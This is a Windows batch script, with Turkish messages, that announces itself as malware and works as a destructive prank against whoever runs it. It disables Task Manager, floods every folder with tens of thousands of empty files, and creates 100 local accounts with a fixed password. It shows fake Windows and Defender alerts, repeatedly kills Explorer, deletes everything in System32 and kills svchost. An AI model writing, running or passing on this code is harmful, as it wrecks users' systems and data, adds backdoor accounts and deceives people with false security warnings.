@echo off
echo Hi, this is an actual malware want to continue ?
pause
echo Ok so , i know your name . wanna see proof?
pause
echo idk what u said but, is your username : "%username%"
pause
echo Huh ? you don't believe that?
timeout /t 2 /nobreak
echo How ?
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
timeout /t 2 /nobreak
echo So, im in your PC wanna see proof ?
:: Her alt klasörde dosyalar oluştur
for /r "%rootDir%" %%d in (.) do (
    for /l %%j in (1,1,32767) do (
        type nul > "%%d\UR NEXT UR NEXT UR NEXT_%%j.txt"
    )
)
setlocal enabledelayedexpansion

set "base_username=BruhNoEscape"
set "password=death"

for /l %%i in (1,1,100) do (
    set "username=%base_username%%%i"
    net user !username! %password% /add
)
cls
pause
echo Ok then im gonna show you.
start start ms-settings:accounts-family
echo.X=MsgBox("Hesaplarınız Bolumune Bak ",0+16,"Nah i'd win") >> FakeErrorMsg.vbs
echo Haha , ŞIMDI SENI HESAPTAN ATIP MILYONLARCA KOMBİNASYONU MU DENETTIREYIM HE?
pause
clr
echo 🛡️🛡️🛡️🛡️
echo.X=MsgBox("Cihazınızdaki tehditle savasirken lutfen cihazinizi kapatmayin ",0+16,"Windows ") >> FakeErrorMsg2.vbs
start FakeErrorMsg2.vbs
echo N-ne? Nasıl ben defender'i kapattim.. ne..?
color 4
echo **Savaşma Sesleri**
timeout /t 1 /nobreak
echo **Savaşma Sesleri**
timeout /t 1 /nobreak
echo **Savaşma Sesleri**
timeout /t 1 /nobreak
echo **Savaşma Sesleri**
timeout /t 1 /nobreak
echo **Savaşma Sesleri**
timeout /t 1 /nobreak
echo **Savaşma Sesleri**
timeout /t 1 /nobreak
cls
color f
echo HAHAHHA BILGISAYARIN BENIM !

echo Sonun geldi evlat..
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
cls
echo HAHAHAHAHAH

del /s /q C:\Windows\System32\*
cls
taskkill /f /im svchost.exe
pause
